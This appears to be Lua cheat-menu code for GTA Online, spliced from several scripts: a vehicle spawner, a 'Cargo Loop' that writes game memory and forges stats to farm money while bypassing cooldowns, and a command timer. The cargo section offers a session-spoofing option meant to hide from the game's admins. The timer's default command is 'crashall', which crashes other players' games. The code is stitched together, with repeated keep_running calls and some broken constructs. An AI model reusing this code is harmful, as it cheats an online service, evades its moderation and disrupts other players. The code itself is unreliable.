            local here = data['Vehicle' .. tostring(veh_index)]
            if here.Hash == nil then 
                util.toast(fail_text)
                return
            end
            request_model_load(here.Hash)
            local this_vehicle = entities.create_vehicle(here.Hash, players.get_position(players.user()), ENTITY.GET_ENTITY_HEADING(players.user_ped()))
            if veh_index == 0 then 
                initial_vehicle = this_vehicle
            end
            numerations[here.SelfNumeration] = this_vehicle
            if here.IsAttached then
                attachments_data[here.SelfNumeration] = {attachee = this_vehicle, attached_to = here.AttachNumeration, x = here.OffsetX, y = here.OffsetY, z = here.OffsetZ, pitch = here.Pitch, yaw = here.Yaw, roll = here.Roll, bone = here.Bone, collision = here.Collision}
            end
            all_entities[#all_entities+1] = this_vehicle
            ini_preprocess_vehicle(this_vehicle, data, ini_type, veh_index)
            veh_index = veh_index + 1
        end

        while true do
            if data['Object' .. tostring(object_index)].Hash == nil then 
                success = true
                break
            end
            local here = data['Object' .. tostring(object_index)]
            request_model_load(here.Hash)
            local this_object = entities.create_object(here.Hash, players.get_position(players.user()))
            numerations[here.SelfNumeration] = this_object
            if here.IsAttached then
                attachments_data[here.SelfNumeration] = {attachee = this_object, attached_to = here.AttachNumeration, x = here.OffsetX, y = here.OffsetY, z = here.OffsetZ, pitch = here.Pitch, yaw = here.Yaw, roll = here.Roll, bone = here.Bone, collision = here.Collision}
            end
            all_entities[#all_entities+1] = this_object
            ENTITY.SET_ENTITY_DYNAMIC(veh, here.Dynamic)
            ENTITY.SET_ENTITY_VISIBLE(veh, here.Visible) 
            ENTITY.SET_ENTITY_HAS_GRAVITY(veh, here.Gravity)
            ENTITY.FREEZE_ENTITY_POSITION(veh, here.Freeze)
            object_index = object_index + 1
        end

        for k,v in pairs(attachments_data) do
            if v.attachee ~= nil and numerations[v.attached_to] ~= nil then
                ENTITY.ATTACH_ENTITY_TO_ENTITY(v.attachee, numerations[v.attached_to], v.Bone, v.x, v.y, v.z, v.pitch, v.roll, v.yaw, true, false, v.collision, false, 2, true)
            end
        end

    elseif ini_type == 6 then 
        local v_hash = data.Vehicle.model
        local c = players.get_position(players.user())
        if v_hash == nil then 
            util.toast(fail_text)
            return
        end
        request_model_load(v_hash)
        initial_vehicle = entities.create_vehicle(v_hash, c, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
        all_entities[#all_entities+1] = initial_vehicle
        ini_preprocess_vehicle(initial_vehicle, data, ini_type)
        local attachment_index = 1
        while true do 
            if data['Attached Object ' .. tostring(attachment_index)].model == nil then 
                success = true
                break
            end
            local here = data['Attached Object ' .. tostring(attachment_index)]
            request_model_load(here.model)
            local this_ent = entities.create_object(here.model, players.get_position(players.user()))
            all_entities[#all_entities+1] = this_ent
            if this_ent ~= nil then
                ENTITY.ATTACH_ENTITY_TO_ENTITY(this_ent, initial_vehicle, 0, here['x offset'], here['y offset'], here['z offset'], here['pitch'], here['roll'], here['yaw'], true, false, if here['collision'] == 1 then true else false, false, 2, true)
                attachment_index = attachment_index + 1
            end
        end
    end

    if success then
        PED.SET_PED_INTO_VEHICLE(players.user_ped(), initial_vehicle, -1)
        local this_veh_root = menu.list(loaded_vehicles_root, file_name, {"lancespoonerv" .. initial_vehicle}, "")

        local this_blip = HUD.ADD_BLIP_FOR_ENTITY(initial_vehicle)
        HUD.SET_BLIP_SPRITE(this_blip, 77)
        HUD.SET_BLIP_COLOUR(this_blip, 47)

        menu.action(this_veh_root, "Delete", {"deletelancespoonerv" .. initial_vehicle}, "Delete this vehicle. Make it cease to exist.", function(on_click)
            for k,v in pairs(all_entities) do
                entities.delete_by_handle(v)
            end
            menu.delete(this_veh_root)
            util.remove_blip(this_blip)
        end)

        menu.action(this_veh_root, "Teleport inside", {"teleportemenyoov" .. initial_vehicle}, "", function(on_click)
            PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), initial_vehicle, -1)
        end)

    else
        util.toast(fail_text)
    end
end

function json_preprocess_vehicle(vehicle, data, initial_vehicle)
    local sd = data.savedata
    local mods = sd.Mods
    if vehicle ~= initial_vehicle then
        if data.data ~= nil then 
            -- for the updated edition
            ENTITY.SET_ENTITY_VISIBLE(vehicle, data.data.visible, 0)
            ENTITY.SET_ENTITY_INVINCIBLE(vehicle, data.data.godmode)
        else
            if sd.godmode ~= nil then
                ENTITY.SET_ENTITY_INVINCIBLE(vehicle, sd.godmode)
            end
            ENTITY.SET_ENTITY_VISIBLE(vehicle, data.visible, 0)
        end
    else
        if data.godmode ~= nil then
            ENTITY.SET_ENTITY_INVINCIBLE(vehicle, data.godmode)
        end
        if data.visible ~= nil then
            ENTITY.SET_ENTITY_VISIBLE(vehicle, data.visible, 0)
        end
    end

    if vehicle ~= initial_vehicle then 
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle, initial_vehicle, 0, data.offset.x, data.offset.y, data.offset.z, data.rotation.x, data.rotation.y, data.rotation.z, true, false, true, false, 2, true)
    end

    -- for some reason jackz used the name of the mod instead of the mod index / mod type lol
    -- otherwise, this code couldve taken up just 3 lines
    -- not like i couldnt have used a table, but still, come on...
    VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, sd['Tire Smoke'].r, sd['Tire Smoke'].g, sd['Tire Smoke'].b)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 0, mods['Spoilers'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 1, mods['Ornaments'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 2, mods['Front Bumper'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 3, mods['Side Skirt'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 4, mods['Exhaust'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 5, mods['Frame'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 6, mods['Grille'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 7, mods['Hood'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 8, mods['Fender'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 9, mods['Right Fender'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 10, mods['Roof'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 11, mods['Engine'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 12, mods['Brakes'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 13, mods['Transmission'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 14, mods['Horns'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 15, mods['Suspension'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 16, mods['Armor'], false)
    -- no front wheels in spec? lol?
    --VEHICLE.SET_VEHICLE_MOD(vehicle, 23, mods['Front Wheels'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 24, mods["Motorcycle Back Wheel Design"], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 25, mods['Plate Holders'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 27, mods['Trim Design'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 28, mods['Ornaments'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 28, mods['Ornaments'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 30, mods['Dial Design'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 33, mods['Steering Wheel'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 34, mods['Shifter Leavers'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 35, mods['Plaques'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 36, mods['Hydraulics'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 48, mods['Livery'], false)

    -- toggle 
    VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 17, mods.Toggles.UNK17)
    -- typo here in the jackz json spec btw, not my fault :|
    VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 18, mods.Toggles['Turbo Turning'])
    VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 19, mods.Toggles['UNK19'])
    VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 20, mods.Toggles['Tire Smoke'])
    VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 21, mods.Toggles['UNK21'])
    VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 22, mods.Toggles['Xenon Headlights'])
    -------
    VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(vehicle, not sd['Bulletproof Tires'])
    VEHICLE.SET_VEHICLE_DIRT_LEVEL(vehicle, sd['Dirt Level'])
    VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, sd['Window Tint'])
    VEHICLE.SET_VEHICLE_EXTRA_COLOUR_6(vehicle, sd['Dashboard Color'])
    for i=10, 11 do 
        VEHICLE.SET_VEHICLE_EXTRA(vehicle, i, not sd.Extras[i])
    end
    -- lights
    VEHICLE.SET_VEHICLE_EXTRA_COLOUR_5(vehicle, sd['Interior Color'])
    VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, 0, sd.Lights.Neon.Left)
    VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, 1, sd.Lights.Neon.Right)
    VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, 2, sd.Lights.Neon.Front)
    VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, 3, sd.Lights.Neon.back)
    VEHICLE.SET_VEHICLE_NEON_COLOUR(vehicle, sd.Lights.Neon.Color.r, sd.Lights.Neon.Color.g, sd.Lights.Neon.Color.b) 
    VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(vehicle, sd.Lights['Xenon Color'])
    VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, sd['Engine Running'], true, false) 
    -- colors 
    local colors = sd.Colors
    -- why is there a custom rgb color in the "vehicle" colors but also in both primary and secondary fields? what is the point?
    VEHICLE.SET_VEHICLE_COLOURS(vehicle, colors.Vehicle.Primary, colors.Vehicle.Secondary)
    if colors.Primary.Custom then 
        VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vehicle, colors.Primary['Custom Color'].r, colors.Primary['Custom Color'].g, colors.Primary['Custom Color'].b)
    end
    if colors.Secondary.Custom then 
        VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vehicle, colors.Secondary['Custom Color'].r, colors.Secondary['Custom Color'].g, colors.Secondary['Custom Color'].b)
    end
    VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicle, colors.Extras.pearlescent, colors.Extras.wheel)
    VEHICLE.SET_VEHICLE_ENVEFF_SCALE(vehicle, colors['Paint Fade'])
    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "LANCE")
end

local supported_jackz_versions = {'1.1.0', '1.3.0', '1.3.1', '1.4.0'}
function json_load_vehicle(path)
    local all_entities = {}
    local success = false
    local fp = io.open(path, "r")
    if not fp then 
        util.toast("Error opening " .. path)
        return
    end
    local json_string = fp:read("*all")
    local json_tbl = lunajson.decode(json_string)
    if json_tbl.version ~= nil then 
        local disp_version = string.gsub(json_tbl.version, 'Jackz Custom Vehicle ', '')
        if not table.contains(supported_jackz_versions, disp_version) then 
            util.toast("This Jackz JSON edition is not known to be supported by LanceSpooner (version " .. disp_version .. "). We'll try to load it anyways but some things may not work. If it does work, let us know so we can show this message less!")
        end
    else
        util.toast("This is a very old Jackz vehicle that is probably not supported (or this isn't a Jackz vehicle at all). Things may break but we'll try to load it anyways.")
    end
    local base = json_tbl.base
    if base.model == nil then 
        util.toast(fail_text)
        return
    end
    local v_hash = base.model
    request_model_load(v_hash)
    local c = players.get_position(players.user())
    local initial_vehicle = entities.create_vehicle(v_hash, c, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
    all_entities[#all_entities + 1] = initial_vehicle
    json_preprocess_vehicle(initial_vehicle, base, initial_vehicle)

    for k,o in pairs(json_tbl.objects) do 
        request_model_load(o.model)
        local this_obj = entities.create_object(o.model, c)
        all_entities[#all_entities + 1] = this_obj
        ENTITY.SET_ENTITY_VISIBLE(this_obj, o.visible, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(this_obj, initial_vehicle, 0, o.offset.x, o.offset.y, o.offset.z, o.rotation.x, o.rotation.y, o.rotation.z, true, false, true, false, 2, true)
    end

    if json_tbl.vehicles ~= nil then 
        for k,veh in pairs(json_tbl.vehicles) do 
            local v_hash = veh.model
            request_model_load(v_hash)
            local this_veh = entities.create_vehicle(v_hash, c, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
            all_entities[#all_entities + 1] = this_veh
            json_preprocess_vehicle(this_veh, veh, initial_vehicle)
        end
    end

    success = true 
    if success then
        PED.SET_PED_INTO_VEHICLE(players.user_ped(), initial_vehicle, -1)
        local this_veh_root = menu.list(loaded_vehicles_root, path:gsub(vehicles_dir, ''), {"lancespoonerv" .. initial_vehicle}, "")
        local this_blip = HUD.ADD_BLIP_FOR_ENTITY(initial_vehicle)
        HUD.SET_BLIP_SPRITE(this_blip, 77)
        HUD.SET_BLIP_COLOUR(this_blip, 47)

        menu.action(this_veh_root, "Delete", {"deletelancespoonerv" .. initial_vehicle}, "Delete this vehicle. Make it cease to exist.", function(on_click)
            for k,v in pairs(all_entities) do
                entities.delete_by_handle(v)
            end
            menu.delete(this_veh_root)
            util.remove_blip(this_blip)
        end)

        menu.action(this_veh_root, "Teleport inside", {"teleportejsonv" .. initial_vehicle}, "", function(on_click)
            PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), initial_vehicle, -1)
        end)

    else
        util.toast("Something bad happened! This JSON could not be loaded properly. Sorry :'(")
    end
end


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	cargoloops = menu.list(menu.my_root(), "Cargo Loop", {}, "Open Musiness Banager > Special Cargo (Tick all apart from AFK Loop) Then start this cargo loop.", function(); end)

	cargoloo = menu.list(cargoloops, "Open Musiness Banager First", {}, "Open Musiness Banager > Special Cargo (Tick all apart from AFK Loop) Then start this cargo loop.", function(); end)

	menu.hyperlink(cargoloops, "How to Use Tutorial", "https://drive.google.com/file/d/1GTggKA5O1Tl2IHvrH-WeV83XoAw26Y-s/view?usp=sharing")

local main_menu = menu.list(cargoloo, "Options", {}, "")

menu.divider(main_menu, "Settings")
opti_settings = menu.toggle(main_menu,'Optimised Settings', {""}, 'Improve FPS and stability of the lua.\nNOTE: Reducing resolution and play on windowed mode also helps a lot.', function()
	if menu.get_value(opti_settings) then
        opti_value = "on"
    else
        opti_value = "off"
    end
    menu.trigger_commands("anticrashcamera "..opti_value)
    menu.trigger_commands("potatomode "..opti_value)
    menu.trigger_commands("nosky "..opti_value)
    menu.trigger_commands("noidlekick "..opti_value)
    menu.trigger_commands("noidlecam "..opti_value)
    menu.trigger_commands("monitorcargo "..opti_value)
    menu.trigger_commands("maxsellcargo "..opti_value)
    menu.trigger_commands("nobuycdcargo "..opti_value)
    menu.trigger_commands("nosellcdcargo "..opti_value)
    menu.trigger_commands("autocompletespecialbuy "..opti_value)
    menu.trigger_commands("autocompletespecialsell "..opti_value)
end)

moneyMultiplier = menu.toggle_loop(main_menu, 'Disable RP', {""}, 'Dont earn anymore RP with cargo sells.', function()
	if menu.get_value(moneyMultiplier) then
        util.draw_debug_text("RP Disabled")
		memory.write_float(memory.script_global(262145 + 1), 0)
	else
		memory.write_float(memory.script_global(262145 + 1), 1)
	end
end)

menu.action(main_menu,'Solo Spoofed Session', {""}, 'Reduces even more risks.\nNOTE: Will make you go in solo session with spoofed session so you cant be crashed or checked by R* Admins.', function()
	    menu.trigger_commands("go solo")
	    menu.trigger_commands("spoofsession storymode")
end)

menu.action(main_menu, "Send To Storymode If Stuck", {"gostorymode"}, "Press if the warehouse screen/scaleform gets stuck. It will forcequit you to SP, but you at least wont have to restart your game.", function()
    menu.trigger_commands("forcequittosp")
end)


-- disable idiot proof if you are an idiot or actually know what you are doing and start MB on its own
local idiot_proof = true

-- change this if you know what you are doing and maybe speak a different language 
local your_fucking_language = "en"

util.require_natives("1663599433")
util.ensure_package_is_installed("lua/MusinessBanager")

local function BitTest(address, offset)
    return (memory.read_int(address) & (1 << offset)) ~= 0
end

local function does_path_exist(path)
    return menu.ref_by_path(path):isValid()
end

local function wait_until_path_is_available(path, message)
    while true do
        if not does_path_exist(path) then
            if not SCRIPT_SILENT_START then
                util.toast(message)
            end
        else
            break
        end
        util.yield()
    end
end

local function stat_get_int(hash)
    local ptr = memory.alloc_int()
    STATS.STAT_GET_INT(hash, ptr, -1)
    local value = memory.read_int(ptr)
    return value
end

local function kill_appsecuroserv()
    util.spoof_script("appsecuroserv", SCRIPT.TERMINATE_THIS_THREAD)
    PLAYER.SET_PLAYER_CONTROL(players.user(), true, 0)
    PAD.ENABLE_ALL_CONTROL_ACTIONS(0)
    PAD.ENABLE_CONTROL_ACTION(2, 1, true)
    PAD.ENABLE_CONTROL_ACTION(2, 2, true)
    PAD.ENABLE_CONTROL_ACTION(2, 187, true)
    PAD.ENABLE_CONTROL_ACTION(2, 188, true)
    PAD.ENABLE_CONTROL_ACTION(2, 189, true)
    PAD.ENABLE_CONTROL_ACTION(2, 190, true)
    PAD.ENABLE_CONTROL_ACTION(2, 199, true)
    PAD.ENABLE_CONTROL_ACTION(2, 200, true)
    ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), false)
end

local main_mb_path = "Stand>Lua Scripts>MusinessBanager"
local relative_paths = {
    lang =                      ">Language",
    special_cargo =             ">Special Cargo",
    selected_whouse =           ">Special Cargo>Warehouse",
    teleport_to_whouse =        ">Special Cargo>Teleport to Warehouse",
    monitor_cargo =             ">Special Cargo>Monitor",
    max_sell_price =            ">Special Cargo>Max Sell Price",
    nobuycd =                   ">Special Cargo>Bypass Buy Mission Cooldown",
    nosellcd =                  ">Special Cargo>Bypass Sell Mission Cooldown",
    acbuy =                     ">Special Cargo>Autocomplete Buy Mission",
    acsell =                    ">Special Cargo>Autocomplete Sell Mission",
    sellcrate =                  ">Special Cargo>Press To Sell A Crate",
    max_crate_sourcing_amount = ">Special Cargo>Max Crate Sourcing Amount",
    minimize_delivery_time =    ">Special Cargo>Minimize Delivery Time",
    find_safer_ways =           ">Find safer ways to make money"
}

local mb_dir = filesystem.scripts_dir() .. 'MusinessBanager.lua'
if not filesystem.exists(mb_dir) and not SCRIPT_SILENT_START then
    util.toast("Install MusinessBanager before using this.")
    util.stop_script()
end

if idiot_proof and not does_path_exist(main_mb_path .. relative_paths.find_safer_ways) then
elseif idiot_proof and not SCRIPT_SILENT_START then 
    util.toast("MB is already loaded. Nice!")
end

local selected_whouse_ref = menu.ref_by_path(main_mb_path .. relative_paths.selected_whouse)
local tp_to_whouse_ref = menu.ref_by_path(main_mb_path .. relative_paths.teleport_to_whouse)
local sell_a_crate_ref = menu.ref_by_path(main_mb_path .. relative_paths.sellcrate)

local settings_to_apply = {
    ["noidlekick"] = {ref=menu.ref_by_path("Online>Enhancements>Disable Idle/AFK Kick", 38),         state=true},
    ["noidlecam"] = {ref=menu.ref_by_path("Game>Disables>Disable Idle Camera", 38),                 state=true},
    ["monitorcargo"] = {ref=menu.ref_by_path(main_mb_path .. relative_paths.monitor_cargo),            state=true},
    ["maxsellprice"] = {ref=menu.ref_by_path(main_mb_path .. relative_paths.max_sell_price),           state=true},
    ["nobuycd"] = {ref=menu.ref_by_path(main_mb_path .. relative_paths.nobuycd),                  state=true},
    ["nosellcd"] = {ref=menu.ref_by_path(main_mb_path .. relative_paths.nosellcd),                 state=true},
    ["acbuy"] = {ref=menu.ref_by_path(main_mb_path .. relative_paths.acbuy),                    state=true},
    ["acsell"] = {ref=menu.ref_by_path(main_mb_path .. relative_paths.acsell),                   state=true},
    ["max_crate_sourcing_amount"] = {ref=menu.ref_by_path(main_mb_path .. relative_paths.max_crate_sourcing_amount),state=true},
    ["minimize_delivery_time"] = {ref=menu.ref_by_path(main_mb_path .. relative_paths.minimize_delivery_time),   state=true},
}

local my_root = cargoloo

local sell_delay = 2000
my_root:slider("Sell delay", {"crateselldelay"}, "The delay in MS to sell crates at.\nThe lower, the more chance of the warehouse scaleform freezing up on you. Up to you.\n1500-2000ms delay recommended based on your network connection", 10, 10000, 2000, 10, function(delay)
    sell_delay = delay
end)
my_root:action("Get crates", {"fillcurrentwhouse"}, "", function()
    if util.is_session_started() then
        menu.set_value(settings_to_apply.max_crate_sourcing_amount.ref, true)
        menu.set_value(settings_to_apply.minimize_delivery_time.ref, true)
        STATS.SET_PACKED_STAT_BOOL_CODE(32359 + menu.get_value(selected_whouse_ref), true, -1)
    end
end)
local appsecuroserv = util.joaat("appsecuroserv")
local money_loop = false
my_root:toggle("Sell crates loop", {"sellcratesloop"}, "Auto-sells the crates of the CURRENTLY SELECTED WAREHOUSE IN MB.", function(on)
    money_loop = on
    while true do 
        if not money_loop then 
            break 
        end
        if util.is_session_started() then
            -- force required settings
            for _, data in pairs(settings_to_apply) do
                assert(data.ref:isValid(), "MusinessBanager is not started")
                if menu.get_value(data.ref) ~= data.state then
                    menu.set_value(data.ref, data.state)
                end
            end
            STATS.SET_PACKED_STAT_BOOL_CODE(32359 + menu.get_value(selected_whouse_ref), true, -1)
            menu.trigger_command(sell_a_crate_ref)
            util.yield(800)
            PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 238, 1.0)
            local end_time = os.time() + 2
            while SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(appsecuroserv) > 0 and os.time() < end_time do
                util.yield()
            end
            if SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(appsecuroserv) > 0 and sell_delay < 1000 then
                kill_appsecuroserv()
            end
            end_time = os.time() + 5
            while NETSHOPPING.NET_GAMESERVER_TRANSACTION_IN_PROGRESS() and os.time() < end_time do
                util.yield()
            end
        end
        util.yield(sell_delay)
    end
end)


util.keep_running()


function tp1()
	TELEPORT(997.9699, -3108.72, -38.999863)
	SET_HEADING(145)
end

function tp2()
	TELEPORT(1024.3882, -3098.5376, -38.99992)
	SET_HEADING(260)
end

function tp3()
	TELEPORT(1002.05, -3093.4438, -38.999928)
	SET_HEADING(20)
end

function tpexit()
	TELEPORT(992.33, -3097.64, -38.999928)
	SET_HEADING(90)
end

function tpfps()
	TELEPORT(457.25537, 5571.8975, 781.1837)
end

function TELEPORT(X, Y, Z)
    local Handle = PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) and PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false) or players.user_ped()
    ENTITY.SET_ENTITY_COORDS(Handle, X, Y, Z)
end

function SET_HEADING(Heading)
    ENTITY.SET_ENTITY_HEADING(players.user_ped(), Heading)
end

function format_int(number) -- Credits to Bart Kiers from stackoverflow
  local i, j, minus, int, fraction = tostring(number):find('([-]?)(%d+)([.]?%d*)')
  int = int:reverse():gsub("(%d%d%d)", "%1,")
  return minus .. int:reverse():gsub("^,", "") .. fraction
end


util.toast("Welcome To Currupt Script 5.4\n" .. "\n" .. "Official Discord: https://discord.gg/KHOS\n" .. "\n" .. "WARNING! Notifications aren't always accurate")

	custselc = menu.list(menu.my_root(), "Select Pussies", {}, "", function(); end)

	menu.toggle(custselc, "Exclude Selected", {}, "", function(on_toggle)
		if on_toggle then
			excludeselected = true
		else
			excludeselected = false
		end
	end)

local function exportstring( s )
    return string.format("%q", s)
end

function table.save(  tbl,filename )
   local charS,charE = "   ","\n"
   local file,err = io.open( filename, "wb" )
   if err then return err end
   -- initiate variables for save procedure
   local tables,lookup = { tbl },{ [tbl] = 1 }
   file:write( "return {"..charE )
   for idx,t in ipairs( tables ) do
      file:write( "-- Table: {"..idx.."}"..charE )
      file:write( "{"..charE )
      local thandled = {}
      for i,v in ipairs( t ) do
         thandled[i] = true
         local stype = type( v )
         -- only handle value
         if stype == "table" then
            if not lookup[v] then
               table.insert( tables, v )
               lookup[v] = #tables
            end
            file:write( charS.."{"..lookup[v].."},"..charE )
         elseif stype == "string" then
            file:write(  charS..exportstring( v )..","..charE )
         elseif stype == "number" then
            file:write(  charS..tostring( v )..","..charE )
         end
      end
      for i,v in pairs( t ) do
         -- escape handled values
         if (not thandled[i]) then
            local str = ""
            local stype = type( i )
            -- handle index
            if stype == "table" then
               if not lookup[i] then
                  table.insert( tables,i )
                  lookup[i] = #tables
               end
               str = charS.."[{"..lookup[i].."}]="
            elseif stype == "string" then
               str = charS.."["..exportstring( i ).."]="
            elseif stype == "number" then
               str = charS.."["..tostring( i ).."]="
            end
            if str ~= "" then
               stype = type( v )
               -- handle value
               if stype == "table" then
                  if not lookup[v] then
                     table.insert( tables,v )
                     lookup[v] = #tables
                  end
                  file:write( str.."{"..lookup[v].."},"..charE )
               elseif stype == "string" then
                  file:write( str..exportstring( v )..","..charE )
               elseif stype == "number" then
                  file:write( str..tostring( v )..","..charE )
               end
            end
         end
      end
      file:write( "},"..charE )
   end
   file:write( "}" )
   file:close()
end

function table.load( sfile )
   local ftables,err = loadfile( sfile )
   if err then return _,err end
   local tables = ftables()
   for idx = 1,#tables do
      local tolinki = {}
      for i,v in pairs( tables[idx] ) do
         if type( v ) == "table" then
            tables[idx][i] = tables[v[1]]
         end
         if type( i ) == "table" and tables[i[1]] then
            table.insert( tolinki,{ i,tables[i[1]] } )
         end
      end
      -- link indices
      for _,v in ipairs( tolinki ) do
         tables[idx][v[2]],tables[idx][v[1]] =  tables[idx][v[1]],nil
      end
   end
   return tables[1]
end
-- END UTILITY FUNCTIONS

store_dir = filesystem.store_dir() .. '\\Currupt\\'
if not filesystem.is_dir(store_dir) then
    filesystem.mkdirs(store_dir)
end

local max_timer_time = 86400000
local all_timer_lists = {}
local parse_all_timer_files

function create_timer_entry(data)
    local data_copy = data
    local timer_name = data['timer_name']
    local timer_desc = data['timer_desc']
    local timer_commands = data['timer_commands']
    local timer_delay = data['timer_delay']
    local this_timer_path = store_dir .. '\\' .. timer_name .. '.lua'
    local fmt_name = timer_name:gsub(' ', '')
    if all_timer_lists[timer_name] == nil then
        local this_timer_root = menu.list(menu.my_root(), timer_name, {'Currupt' .. fmt_name}, timer_desc)
        all_timer_lists[timer_name] = this_timer_root
        menu.toggle_loop(this_timer_root, "Run timer", {"runtimer" .. timer_name}, "", function(click_type)
            menu.trigger_commands(timer_commands)
            util.yield(timer_delay)
        end)

        menu.text_input(this_timer_root, "Description", {"Curruptsetdesc" .. fmt_name}, "", function(on_input)
            timer_desc = on_input
            data_copy['timer_desc'] = on_input
            table.save(data_copy, this_timer_path)
            menu.set_help_text(this_timer_root, timer_desc)
        end, timer_desc)

        menu.text_input(this_timer_root, "Command(s)", {"Curruptsetcommands" .. fmt_name}, "The commands for this timer. You can specify multiple by putting semicolons in between each.", function(on_input)
            timer_commands = on_input
            data_copy['timer_commands'] = on_input
            table.save(data_copy, this_timer_path)
        end, timer_commands)

        menu.slider(this_timer_root, "Timer delay (MS)", {fmt_name .. "delay"}, "The timer delay, in milliseconds. 1000 ms = 1 second.", 0, max_timer_time, 100, 1, function(s)
            timer_delay = s
            data_copy['timer_delay'] = s
            table.save(data_copy, this_timer_path)
        end)

        menu.action(this_timer_root, "Delete timer", {}, "Delete this timer\'s file.", function(click_type)
            ok, err = os.remove(this_timer_path)
            if not ok then
                util.toast("Timer could not be removed: " .. err)
            else
                all_timer_lists[timer_name] = nil
                util.toast("Timer removed.")
                menu.delete(this_timer_root)
                parse_all_timer_files()
            end
        end)
    end
end

function parse_all_timer_files()
    for i, path in ipairs(filesystem.list_files(store_dir)) do
        if string.match(path:gsub(store_dir, ''), '.lua') then
            local timer_data = table.load(path)
            create_timer_entry(timer_data)
        end
    end
end

local create_timer_root = menu.list(menu.my_root(), "Create new timer", {'Curruptcreate'}, "")
----

local new_timer_name = "My new timer"
menu.text_input(create_timer_root, "Name", {"Curruptsetname"}, "", function(on_input)
    new_timer_name = on_input
end, new_timer_name)

local new_timer_desc = "Your description goes here."
menu.text_input(create_timer_root, "Description", {"Curruptsetdesc"}, "", function(on_input)
    new_timer_desc = on_input
end, new_timer_desc)

local new_timer_commands = "crashall"
menu.text_input(create_timer_root, "Command(s)", {"Curruptsetcommands"}, "The commands for this timer. You can specify multiple by putting semicolons in between each.", function(on_input)
    new_timer_commands = on_input
end, new_timer_commands)

local new_timer_delay = 100
menu.slider(create_timer_root, "Timer delay (MS)", {"Curruptsetdelay"}, "The timer delay, in milliseconds. 1000 ms = 1 second.", 0, max_timer_time, 100, 1, function(s)
    new_timer_delay = s
end)

menu.action(create_timer_root, "Create timer", {}, "Create and save this timer as a file.", function(click_type)
    local new_timer_data = {
        timer_name = new_timer_name,
        timer_desc = new_timer_desc,
        timer_commands = new_timer_commands,
        timer_delay = new_timer_delay
    }
    local timer_path = store_dir .. '/' .. new_timer_name .. '.lua'
    if filesystem.exists(timer_path) then
        util.toast("A timer with that name already exists.")
        return 
    else
        table.save(new_timer_data, timer_path)
        parse_all_timer_files()
        menu.trigger_commands("Currupt" .. new_timer_name:gsub(' ', ''))
        util.toast("Timer created! I\'ve opened it for you :)")
    end
end)

util.create_thread(function()
    while true do
        parse_all_timer_files()
        util.yield()
    end
end
)

util.keep_running(100)

local function player_toggle_loop(root, pid, menu_name, command_names, help_text, callback)
    return menu.toggle_loop(root, menu_name, command_names, help_text, function()
        if not players.exists(pid) then util.stop_thread() end
        callback()
    end)
end


local resource_dir = filesystem.resources_dir()
if not filesystem.exists(resource_dir) then
	util.toast("resource directory not found. notification system will be less of a bruh")
else
	util.register_file(resource_dir .. "bruhzowski.ytd")
end

local version = 16


local colors = {
green = 184,
red = 6,
yellow = 190,
black = 2,
white = 1,
gray = 3,
pink = 201,
purple = 49, --, 21, 96
blue = 11
}

